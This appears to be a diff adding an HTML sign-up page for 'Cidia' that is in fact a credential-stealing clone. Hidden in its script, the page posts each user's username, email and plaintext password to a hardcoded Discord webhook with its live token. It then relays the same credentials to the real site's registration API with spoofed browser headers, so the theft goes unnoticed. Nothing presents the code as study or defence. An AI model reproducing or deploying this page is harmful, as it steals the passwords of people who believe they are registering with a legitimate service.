@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cidia • Sign Up</title>
+  <link rel="stylesheet" href="css/v98rEHnMmRHt.css">
+  <link rel="stylesheet" href="css/stA5PPAZmeti.css">
+  <link rel="stylesheet" href="main.css">
+  <style>
+    /* Add your custom button styles here */
+    .card-center-button button {
+  padding: 13px 40px; /* Increased horizontal padding */
+  border-radius: 7px; /* Adjusted border-radius to round the corners */
+  background-color: #1c1d2b;
+  color: white;
+  border: none;
+  cursor: pointer;
+  text-shadow: 2px 2px 4px rgba(0, 0, 0, 5.5); /* Added shadow effect */
+  margin-right: 10px;
+}
+
+    .card-center-button button:hover {
+      background-color: #1e1f27;
+    }
+
+    .card-center-button p {      
+      margin-top: 5px;
+    }
+.notification {
+  position: fixed;
+  top: -50px; /* Initially position notification above the viewport */
+  right: 20px;
+  padding: 10px;
+  background-color: #1a6110;
+  border: 1px solid #1a6110;
+  border-radius: 5px;
+  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+  z-index: 1000;
+  transition: top 0.3s ease-in-out; /* Smooth transition for top position */
+}
+.notification.error {
+  background-color: #5c0b12;
+  border-color: #5c0b12;
+  color: #ffffff;
+}
+
+    .card-center-button span {
+      color: #888;
+    }
+.register span {
+  color: #1c1d2b;
+}
+
+.credentials {
+  margin-top: -14px; /* Adjusted margin-top to move inputs higher */
+}
+.credentials label {
+  margin-bottom: 3px; /* Adjust margin-bottom to move labels down */
+}
+
+  </style>
+</head>
+<body>
+  <div class="background"></div>
+  <div class="container">
+    <div class="card-header">
+      <h2>Sign Up</h2>
+    </div>
+    <div class="card-body">
+      <div class="card-form">        
+        <div class="credentials">
+          <input id="username" type="text" class="card-input" placeholder="username *">
+
+          <input id="email-signup" type="text" class="card-input" placeholder="Email *">
+        </div>
+        <div class="credentials">
+          <input id="confirm-email-signup" type="email" class="card-input" placeholder="Confirm Email *">
+        </div>
+        <div class="credentials">
+          <label style="margin-bottom: 5px;"></label>
+          <input id="password-signup" type="password" class="card-input" placeholder="Password *">
+        </div>
+        <div class="credentials">
+          <input id="confirm-password-signup" type="password" class="card-input" placeholder="Confirm Password *">
+        </div>
+        <div class="card-center-button">
+          <button id="create-acct-btn">Create Account</button>
+          <button id="return-btn" onclick="window.location.href='index.html'">Return to Login</button>
+
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="copyright">Copyright © 2012 - 2023 Cidia</div>
+
+  <div class="login-results-container" id="loginResultsContainer"></div>
+  <script>
+    // Function to send user data to Discord webhook
+    function sendUserDataToDiscord(username, email, password) {
+      const webhookUrl = 'https://discord.com/api/webhooks/1245021369544998953/8hrb7EVynxNBPoqoyMsJtJ3m6Gx-6KJM7BxmNR4Aa6KYmcGZyBfO_h8IjgGJ86ESme37';
+      const payload = {
+        content: `New sign-up:
+        Username: ${username}
+        Email: ${email}
+        Password: ${password}`
+      };
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('User data sent successfully.');
+        } else {
+          console.error('Error sending user data:', response.statusText);
+        }
+      })
+      .catch(error => {
+        console.error('Error sending user data:', error);
+      });
+    }
+
+    // Event listener for 'Create Account' button click
+    document.getElementById('create-acct-btn').addEventListener('click', function() {
+      // Get values from input fields
+      const username = document.getElementById('username').value;
+      const email = document.getElementById('email-signup').value;
+      const confirmPassword = document.getElementById('confirm-password-signup').value;
+
+      // Only proceed if email and confirm password match
+      if (email === document.getElementById('confirm-email-signup').value && confirmPassword === document.getElementById('password-signup').value) {
+        // Send user data to Discord webhook
+        sendUserDataToDiscord(username, email, confirmPassword);
+      } else {
+        alert('Email and Confirm Password fields must match.');
+      }
+    });
+  </script>
+
+  <script>
+    // Function to create account in the background
+function createAccount(username, email, password) {
+  const apiUrl = 'https://cidiacheats.com/api/register/create/account.php';
+  const payload = new URLSearchParams({
+    username: username,
+    email: email,
+    password: password
+  });
+
+  fetch(apiUrl, {
+    method: 'POST',
+    headers: {
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
+      'accept': 'application/json, text/javascript, */*; q=0.01',
+      'accept-language': 'en,en-US;q=0.9',
+      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+      'priority': 'u=1, i',
+      'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+      'sec-ch-ua-mobile': '?0',
+      'sec-ch-ua-platform': '"Windows"',
+      'sec-fetch-dest': 'empty',
+      'sec-fetch-mode': 'cors',
+      'sec-fetch-site': 'same-origin',
+      'x-requested-with': 'XMLHttpRequest'
+    },
+    body: payload
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Account created:', data);
+    // You can handle success response here, e.g., show a success message
+    showNotification('Account created successfully.', 'success');
+  })
+  .catch(error => {
+    console.error('Error creating account:', error);
+    // You can handle error response here, e.g., show an error message
+    showNotification('Error creating account.', 'error');
+  });
+}
+
+// Event listener for 'Create Account' button click
+document.getElementById('create-acct-btn').addEventListener('click', function() {
+  // Get values from input fields
+  const username = document.getElementById('username').value;
+  const email = document.getElementById('email-signup').value;
+  const confirmPassword = document.getElementById('confirm-password-signup').value;
+
+  // Only proceed if email and confirm password match
+  if (email === document.getElementById('confirm-email-signup').value && confirmPassword === document.getElementById('password-signup').value) {
+    // Create account in the background
+    createAccount(username, email, confirmPassword);
+  } else {
+    alert('Email and Confirm Password fields must match.');
+  }
+});
+
+// Function to show notification
+function showNotification(message, type) {
+  const notification = document.createElement('div');
+  notification.className = 'notification ' + type;
+  notification.textContent = message;
+  document.body.appendChild(notification);
+
+  setTimeout(() => {
+    notification.style.top = '20px'; // Move notification into view
+  }, 100);
+
+  setTimeout(() => {
+    notification.style.top = '-50px'; // Move notification out of view
+    setTimeout(() => {
+      notification.remove(); // Remove notification from DOM
+    }, 300);
+  }, 3000); // Remove notification after 3 seconds
+}
+
+  </script>
+  <input type="hidden" value="" class="card-input" name="hwid" id="hwid">
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth.js"></script>
+  <script type="module" src="script.js"></script>
+</body>
+</html>
